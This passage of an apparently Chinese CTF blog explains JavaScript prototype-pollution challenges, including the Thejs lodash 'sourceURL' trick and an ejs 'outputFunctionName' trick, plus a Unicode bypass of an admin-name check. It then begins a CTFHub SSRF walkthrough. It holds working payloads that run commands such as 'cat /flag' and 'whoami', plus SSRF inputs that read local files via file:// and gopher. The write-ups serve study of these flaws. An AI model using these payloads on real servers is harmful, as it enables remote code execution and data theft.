<p>明显的<code>clone-&gt;merge</code>原型链污染，代码逻辑比较简单，一个<code>login</code>，一个<code>register</code>，我们看到<code>clone</code>函数在哪里使用了，<code>action</code>这个路由，咋一看，好像是需要<code>user</code>是<code>ADMIN</code>才可以执行这个反序列化，但是这里注意看，这个<code>if</code>后的大括号，并没有包括下面两行代码，我有充分的理由怀疑出题人这里大括号位置搞错了，这样的话，ADMIN的限制也就不存在了，而且他这个<code>if</code>也没有<code>return</code>出去，代码还是会往下执行。</p>
<p>先随便注册一个用户，否则会报<code>Cannot read property &#39;user&#39; of undefined</code>错，因为需要<code>req.session.user.data = clone(req.body)</code></p>
<p>然后直接构造<code>payload</code>到<code>action</code>处发包</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">"outputFunctionName"</span><span class="token punctuation">:</span><span class="token string">"a; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag'); //"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>再访问首页触发<code>payload</code>，即可拿到flag</p>
<p>但是如果限制了登录呢？我们再来看代码逻辑</p>
<p><code>login</code>那里有个<code>safeKeyword</code>正则校验是否为admin，后面存入<code>session</code>的时候有一个<code>toUpperCase()</code>的操作，这里参考P🐮的 <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性</a></p>
<p>直接把原文搬过来了</p>
<blockquote>
<p>在javascript中有几个特殊的字符需要记录一下</p>
<p>对于toUpperCase():</p>
<pre class="language-none"><code class="language-none">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</code></pre>

<p>对于toLowerCase():</p>
<pre class="language-none"><code class="language-none">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</code></pre>

<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
</blockquote>
<p>直接注册的时候把 admin 写成 adm<code>ı</code>n 即可绕过上面的限制了。后面思路还是一样。</p>
<h3 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h3><p>P🐮知识星球<a href="https://code-breaking.com/">两周年活动</a>，2018年的，我那时候还没加入。。。说多了都是泪。。有机会把几道题都玩玩</p>
<p>题目链接：<a href="https://code-breaking.com/puzzle/9/">https://code-breaking.com/puzzle/9/</a></p>
<p>这题主要涉及原型链的利用，利用方式不复杂，主要还是得找到关键点，得看懂代码</p>
<p>拿到题目源码，<code>npm install</code>把模块下一下，就可以用node跑了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210816173013310.png" alt loading="lazy"></p>
<p>看到<code>server.js</code>源码</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'thejs.session'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'aA0'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">false</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">filePath<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// define the template engine</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> compiled <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">template</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        <span class="token keyword">let</span> rendered <span class="token operator">=</span> <span class="token function">compiled</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">...</span>options<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> rendered<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">language</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token literal-property property">category</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
    <span class="token comment">// 接收post请求</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 对象数据合并操作</span>
        data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
        <span class="token comment">// 把data存到session中</span>
        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> data
    <span class="token punctuation">&#125;</span>
    
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">language</span><span class="token operator">:</span> data<span class="token punctuation">.</span>language<span class="token punctuation">,</span> 
        <span class="token literal-property property">category</span><span class="token operator">:</span> data<span class="token punctuation">.</span>category
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port 3000!</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>直接就看到了<code>lodash.merge</code>这个操作，具体可以回顾我前面的 <a href="https://www.extrader.top/posts/45af3b18/">JavaScript原型链污染漏洞学习</a></p>
<p>先看一下发送正常的数据包，后端的数据变化</p>
<pre class="language-none"><code class="language-none">language[]&#x3D;python&amp;language[]&#x3D;go&amp;category[]&#x3D;pwn</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210816173909214.png" alt loading="lazy"></p>
<p>步过：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210816174013095.png" alt loading="lazy"></p>
<p>可以看到将<code>language</code>和<code>category</code>这两个数组对象存到了data中，简单来说，就是在data这个对象中添加了两个数组对象，数组的值就是我们post提交的值</p>
<p>根据我们前面分析的<code>merge</code>利用操作，我们可以直接post一个<code>json</code>格式的字符串，来对data这个对象的原型进行修改，data对象的原型就是<code>Object</code>，看下<code>data.__proto__</code>就可以知道</p>
<p>那我们这里可以尝试一下</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"name"</span><span class="token operator">:</span><span class="token string">"extrader"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>注意要设置<code>Content-Type: application/json</code>，否则后端<code>express</code>不会解析<code>json</code>，而且要保证子类中没有<code>name</code>这个变量，子类会继承父类的所有方法，只有当前类没有定义这个变量，才会去父类寻找。</p>
<p>断点下着，看调试结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210816174956140.png" alt loading="lazy"></p>
<p>步过：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210816175302271.png" alt loading="lazy"></p>
<p>看到上图，我们成功污染了Object原型方法，在里面加入了一个name，那这个时候，改如何利用这一点？我们的目的，RCE</p>
<p>所以我们需要找到一个在影响Object后可以RCE的地方，其实这才是关键。。。</p>
<p>直接看结果吧</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">filePath<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// define the template engine</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> compiled <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">template</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        <span class="token keyword">let</span> rendered <span class="token operator">=</span> <span class="token function">compiled</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">...</span>options<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> rendered<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>

<p><code>lodash.template</code>：一个模板引擎 方法，我们可以在<code>server.js</code>的代码中看到</p>
<p>找到源代码，主要看以下代码</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Use a sourceURL for easier debugging.</span>
<span class="token keyword">var</span> sourceURL <span class="token operator">=</span> <span class="token string">'sourceURL'</span> <span class="token keyword">in</span> options <span class="token operator">?</span> <span class="token string">'//# sourceURL='</span> <span class="token operator">+</span> options<span class="token punctuation">.</span>sourceURL <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
<span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">attempt</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">Function</span><span class="token punctuation">(</span>importsKeys<span class="token punctuation">,</span> sourceURL <span class="token operator">+</span> <span class="token string">'return '</span> <span class="token operator">+</span> source<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> importsValues<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p><code>options</code>是一个<code>Object</code>，<code>sourceURL</code>这个变量取<code>options.sourceURL</code>中的值，原本<code>options</code>中是没有<code>sourceURL</code>这个值的，于是这个变量为空</p>
<p>但是通过原型链污染，我们可以令<code>options.sourceURL</code>中有值，即取到<code>Object</code>中的值，于是我们就可以控制<code>sourceURL</code>这个变量</p>
<p>在后面我们可以看到<code>sourceURL</code>被拼接到<code>Function</code>方法的最后一个参数，这个参数是<code>一个含有包括函数定义的 JavaScript 语句的字符串。</code></p>
<p><code>Function</code>这里定义了一个函数是不会调用的，但后面跟了个<code>apply</code>方法，而这个方法就是给前面的<code>Function</code>传值调用的，于是就执行了<code>Function</code>中的代码</p>
<p>构造恶意payload如下</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"sourceURL"</span><span class="token operator">:</span><span class="token string">"\nreturn e=> &#123;return global.process.mainModule.constructor._load('child_process').execSync('whoami')&#125;\n//"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>注意这里为什么要用<code>e=&gt;</code>箭头函数，如果不使用的话，会报一个<code>TypeError: compiled is not a function</code>错误</p>
<p><code>compiled</code>得到的是<code>lodash.template</code>返回的结果，即<code>template</code>中定义的<code>result</code>，而这个结果需要是一个<code>function</code>，因为后面有<code>compiled(&#123;...options&#125;)</code>调用，具体看<code>server</code>代码</p>
<p>所以我们需要使用箭头函数返回一个<code>function</code>，使得程序能够继续运行下去</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210816194701617.png" alt loading="lazy"></p>
<p>以上payload确实可以得到命令执行的结果，但是这样并不好</p>
<p>P🐮给出的解释如下</p>
<blockquote>
<p>原型链污染攻击有个弊端，就是你一旦污染了原型链，除非整个程序重启，否则所有的对象都会被污染与影响。<br>这将导致一些正常的业务出现bug，或者就像这道题里一样，我的payload发出去，response里就有命令的执行结果了。这时候其他用户访问这个页面的时候就能看到这个结果，所以在CTF中就会泄露自己好不容易拿到的flag，所以需要一个for循环把Object对象里污染的原型删掉。</p>
</blockquote>
<p>如果我们用上面的payload，然后我们随意访问题目链接，都会将我们命令执行的结果输出出来，于是就有了改进后的payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"sourceURL"</span><span class="token operator">:</span><span class="token string">"\nreturn e=> &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('whoami')&#125;\n//"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>这样就不会出现破坏真实业务这种情况了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%87%A0%E9%81%93JavaScript%E9%A2%98/image-20210816192145910.png" alt loading="lazy"></p>
<p>命令执行还可以使用<code>require</code></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">global<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>但是这道题中并没有<code>require</code></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>原型链还是比较有意思的，但总的来说还是代码审计，慢慢来吧</li>
<li>未完待续，后面如果碰到了有意思<code>JavaScript</code>的题还会继续往上面放</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a></li>
<li><a href="https://www.zhaoj.in/read-6462.html">i春秋2020新春战“疫”网络安全公益赛GYCTF 两个 NodeJS 题 WriteUp</a></li>
<li><a href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>原型链</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFHub-SSRF学习</title>
    <url>/posts/ad205f1c/</url>
    <content><![CDATA[<p>主要学习一下内网中各种常用的协议，一步步来</p>
<span id="more"></span>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SSRF漏洞的主要成因主要是因为Web应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤</p>
<p>攻击者利用SSRF可以实现的攻击如下：</p>
<ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li>
<li>攻击运行在内网或本地的应用程序(比如溢出);</li>
<li>对内网web应用进行指纹识别，通过访问默认文件实现;</li>
<li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击(比如struts2，sqli等);</li>
<li>利用file协议读取本地文件等。</li>
</ol>
<p>CTFHub上的题</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707142325348.png" alt loading="lazy"></p>
<h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>题目提示<code>尝试访问位于127.0.0.1的flag.php吧</code></p>
<p>http协议直接读了</p>
<pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707142536551.png" alt loading="lazy"></p>
<h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>题目提示<code>尝试去读取一下Web目录下的flag.php吧</code></p>
<p>file协议读取文件，需要绝对路径</p>
<pre class="language-none"><code class="language-none">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707144256095.png" alt loading="lazy"></p>
<p>我们可以再读一下index.php看看漏洞代码，代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>可以看到，这里使用的是PHP <code>cURL</code> 函数来进行数据的获取，具体可参考 -&gt; <a href="https://www.runoob.com/php/php-ref-curl.html">PHP cURL 函数</a></p>
<p>支持http、https、ftp、gopher、telnet、dict、file和ldap协议</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>题目提示<code>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</code></p>
<p>http请求，放到bp里跑一下端口即可，当然也可以先用dict协议来进行端口探测，然后再使用http来访问内容</p>
<pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8704</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707151631243.png" alt loading="lazy"></p>
<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>题目提示<code>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>
<p>扫描结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707155826050.png" alt loading="lazy"></p>
<p>访问flag.php提示<code>Just View From 127.0.0.1</code></p>
<p>利用SSRF请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707160354027.png" alt loading="lazy"></p>
<p>另外用file可以读到源码</p>
<p>flag.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- Debug: key=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>

<p>可以看到需要POST一个key，并且key要等于md5(flag)，才可以拿到flag，并且需要<code>$_SERVER[&quot;REMOTE_ADDR&quot;] == &quot;127.0.0.1&quot;</code> </p>
<p>key前面是拿到了的，为<code>bacd40b119dfa24fa24640331508799f</code></p>
<p>于是利用<code>gopher</code>协议发包</p>
<p>数据包为</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">36</span></span>

